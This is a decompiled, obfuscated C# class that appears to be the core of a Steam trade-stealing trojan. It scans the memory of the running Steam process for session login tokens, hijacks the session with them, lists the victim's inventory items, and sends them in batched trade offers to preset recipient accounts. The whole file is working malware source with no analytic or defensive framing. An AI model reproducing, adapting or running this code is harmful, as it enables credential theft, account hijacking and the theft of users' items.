using System;
using System.Collections;
using System.Collections.Generic;
using System.Diagnostics;
using System.Net;
using System.Reflection;
using System.Runtime.CompilerServices;
using System.Text;
using System.Text.RegularExpressions;

public class GClass0
{
	public CookieContainer cookieContainer_0 = new CookieContainer();

	private List<string[]> list_0 = new List<string[]>();

	public List<string> list_1 = new List<string>();

	private List<string[]> list_2 = new List<string[]>();

	[CompilerGenerated]
	private string string_0;

	[SpecialName]
	private string method_0()
	{
		return (list_1.Count > 0) ? list_1[0].Substring(0, 17) : null;
	}

	[SpecialName]
	[CompilerGenerated]
	private string method_1()
	{
		return string_0;
	}

	[SpecialName]
	[CompilerGenerated]
	private void method_2(string string_1)
	{
		string_0 = string_1;
	}

	public void method_3(string string_1, string string_2, string string_3)
	{
		list_0.Add(new string[3] { string_1, string_2, string_3 });
	}

	private string method_4(CookieContainer cookieContainer_1, string string_1)
	{
		FieldInfo field = typeof(CookieContainer).GetField("m_domainTable", BindingFlags.Instance | BindingFlags.NonPublic);
		Hashtable hashtable = (Hashtable)field.GetValue(cookieContainer_1);
		foreach (string key3 in hashtable.Keys)
		{
			object obj = hashtable[key3];
			FieldInfo field2 = obj.GetType().GetField("m_list", BindingFlags.Instance | BindingFlags.NonPublic);
			SortedList sortedList = (SortedList)field2.GetValue(obj);
			foreach (string key4 in sortedList.Keys)
			{
				CookieCollection cookieCollection = (CookieCollection)sortedList[key4];
				foreach (Cookie item in cookieCollection)
				{
					if (item.Name == string_1)
					{
						return item.Value.ToString();
					}
				}
			}
		}
		return string.Empty;
	}

	private List<string[][]> method_5(List<string[]> list_3, int int_0)
	{
		List<string[][]> list = new List<string[][]>();
		int num = 0;
		if (list_3 != null)
		{
			List<string[]> list2 = new List<string[]>();
			for (int i = 0; i < list_3.Count; i++)
			{
				list2.Add(list_3[i]);
				num++;
				if (num == int_0)
				{
					list.Add(list2.ToArray());
					list2.Clear();
					num = 0;
				}
			}
			if (list2.Count > 0)
			{
				list.Add(list2.ToArray());
			}
			return list;
		}
		return null;
	}

	private static string smethod_0(string string_1, string string_2)
	{
		if (string_1.Contains(string_2))
		{
			string[] array = string_1.Split(new char[2] { ':', ';' }, StringSplitOptions.RemoveEmptyEntries);
			for (int i = 0; i < array.Length; i++)
			{
				if (array[i] == string_2)
				{
					string text = array[i + 1];
					if (text != null)
					{
						return text;
					}
				}
			}
		}
		return null;
	}

	private void method_6(ref List<string[]> list_3, List<string[]> list_4)
	{
		if (list_4 == null)
		{
			return;
		}
		for (int i = 0; i < list_4.Count; i++)
		{
			if (!list_3.Contains(list_4[i]))
			{
				list_3.Add(list_4[i]);
			}
		}
	}

	public List<string[]> method_7(string string_1, string string_2, string[] string_3 = null)
	{
		List<string[]> list_ = new List<string[]>();
		if (string_3 == null)
		{
			string text = "profiles/" + string_1 + "/inventory/json/" + string_2 + "/2/?trading=1&market=1";
			string string_4 = GClass13.smethod_1(cookieContainer_0, text);
			try
			{
				list_ = new Class4().method_0(string_4, "2");
			}
			catch
			{
				return null;
			}
		}
		else
		{
			for (int i = 0; i < string_3.Length; i++)
			{
				string text = "profiles/" + string_1 + "/inventory/json/" + string_2 + "/" + string_3[i] + "/?trading=1&market=1";
				string string_4 = GClass13.smethod_1(cookieContainer_0, text);
				try
				{
					List<string[]> list_2 = new Class4().method_0(string_4, string_3[i]);
					method_6(ref list_, list_2);
				}
				catch
				{
				}
			}
		}
		return (list_.Count > 0) ? list_ : null;
	}

	public void method_8(ref List<string[]> list_3, string string_1)
	{
		string[] array = string_1.Split(new char[1] { ',' });
		List<string[]> list = new List<string[]>();
		for (int i = 0; i < list_3.Count; i++)
		{
			for (int j = 0; j < array.Length; j++)
			{
				string[] array2 = list_3[i][4].Split(new char[1] { ' ' });
				for (int k = 0; k < array2.Length; k++)
				{
					if (array2[k] == array[j] && !list.Contains(list_3[i]))
					{
						list.Add(list_3[i]);
						break;
					}
				}
			}
		}
		list_3 = ((list.Count > 0) ? list : null);
	}

	public void method_9(string string_1 = "")
	{
		if (list_2 == null)
		{
			return;
		}
		List<string[][]> list = method_5(list_2, 256);
		if (list == null)
		{
			return;
		}
		for (int i = 0; i < list_0.Count; i++)
		{
			for (int j = 0; j < 5; j++)
			{
				int num = j + i * 5;
				if (num >= list.Count)
				{
					break;
				}
				string string_2 = method_11(list[num]);
				string text = method_12(method_4(cookieContainer_0, "sessionid"), string_2, list_0[i], string_1);
				if (text == null)
				{
				}
			}
		}
	}

	private void method_10(string string_1, string string_2, string string_3 = "")
	{
		string[] array = string_1.Split(new char[1] { ',' });
		if (string_1.Length <= 1)
		{
			return;
		}
		for (int i = 0; i < array.Length; i++)
		{
			List<string[]> list_ = method_7(string_2, array[i], (array[i] != "753") ? null : new string[4] { "1", "3", "6", "7" });
			if (list_ != null)
			{
				if (string_3 != string.Empty && string_3.Contains(array[i]))
				{
					method_8(ref list_, smethod_0(string_3, array[i]));
				}
				if (list_ != null)
				{
					list_2.AddRange(list_);
				}
			}
		}
	}

	public string method_11(string[][] string_1)
	{
		string text = string.Empty;
		for (int i = 0; i < string_1.Length; i++)
		{
			text += string.Format("{4}\"appid\":{0},\"contextid\":\"{1}\",\"amount\":{2},\"assetid\":\"{3}\"{5},", string_1[i][0], string_1[i][5], string_1[i][1], string_1[i][2], "{", "}");
		}
		return text.Remove(text.Length - 1);
	}

	private string method_12(string string_1, string string_2, string[] string_3, string string_4 = "")
	{
		return GClass13.smethod_1(cookieContainer_0, "tradeoffer/new/send", "&serverid=1&sessionid=" + string_1 + "&partner=" + string_3[0] + "&tradeoffermessage=" + Uri.EscapeDataString(string_4) + "&json_tradeoffer=" + Uri.EscapeDataString(string.Format("{5}\"newversion\":true,\"version\":2,\"me\":{5}\"assets\":[{3}],\"currency\":[],\"ready\":false{6},\"them\":{5}\"assets\":[],\"currency\":[],\"ready\":false{6}{6}", string_1, string_3[0], string_4, string_2, string_3[2], "{", "}")) + "&trade_offer_create_params=" + Uri.EscapeDataString(string.Format("{0}\"trade_offer_access_token\":\"{2}\"{1}", "{", "}", string_3[2])), "tradeoffer/new/?partner=" + string_3[1] + "&token=" + string_3[2]);
	}

	public void method_13(bool bool_0)
	{
		cookieContainer_0.SetCookies(new Uri("http://steamcommunity.com"), "steamLogin=" + list_1[(!bool_0) ? 1 : 0]);
		cookieContainer_0.SetCookies(new Uri("http://steamcommunity.com"), "steamLoginSecure=" + list_1[bool_0 ? 1 : 0]);
	}

	public void method_14()
	{
		list_1.Clear();
		GClass9.GStruct1 gstruct1_ = default(GClass9.GStruct1);
		while (gstruct1_.intptr_0.ToInt32() == 0)
		{
			GClass9.GetSystemInfo(out gstruct1_);
		}
		IntPtr intptr_ = gstruct1_.intptr_0;
		long num = intptr_.ToInt32();
		List<string> list = new List<string>();
		Process[] processesByName = Process.GetProcessesByName("steam");
		Process process = null;
		for (int i = 0; i < processesByName.Length; i++)
		{
			try
			{
				foreach (ProcessModule module in processesByName[i].Modules)
				{
					if (module.FileName!.EndsWith("steamclient.dll"))
					{
						process = processesByName[i];
						break;
					}
				}
			}
			catch
			{
			}
		}
		if (process == null)
		{
			return;
		}
		IntPtr intptr_2 = GClass9.OpenProcess(1040u, bool_0: false, process.Id);
		GClass9.GStruct0 gstruct0_ = default(GClass9.GStruct0);
		IntPtr intptr_3 = new IntPtr(0);
		while (GClass9.VirtualQueryEx(intptr_2, intptr_, out gstruct0_, 28u) != 0)
		{
			if (gstruct0_.uint_3 == 4 && gstruct0_.uint_2 == 4096)
			{
				byte[] array = new byte[gstruct0_.uint_1];
				GClass9.ReadProcessMemory(intptr_2, gstruct0_.intptr_0, array, gstruct0_.uint_1, out intptr_3);
				string @string = Encoding.UTF8.GetString(array);
				MatchCollection matchCollection = new Regex("7656119[0-9]{10}%7c%7c[A-F0-9]{40}", RegexOptions.IgnoreCase).Matches(@string);
				if (matchCollection.Count > 0)
				{
					foreach (Match item in matchCollection)
					{
						if (!list.Contains(item.Value))
						{
							list.Add(item.Value);
						}
					}
				}
			}
			num += gstruct0_.uint_1;
			if (num >= 2147483647L)
			{
				break;
			}
			intptr_ = new IntPtr(num);
		}
		list_1 = list;
		if (list.Count >= 2)
		{
			method_13(bool_0: false);
			return;
		}
		list_1.Clear();
		method_14();
	}

	public void method_15()
	{
		while (!GClass13.smethod_0(cookieContainer_0))
		{
		}
		if (cookieContainer_0.Count < 4)
		{
			cookieContainer_0 = new CookieContainer();
			method_13(bool_0: true);
			method_15();
		}
		else
		{
			method_2(method_4(cookieContainer_0, "sessionid"));
		}
	}

	public void method_16(string string_1, string string_2 = "")
	{
		method_10(string_1, method_0(), string_2);
	}
}
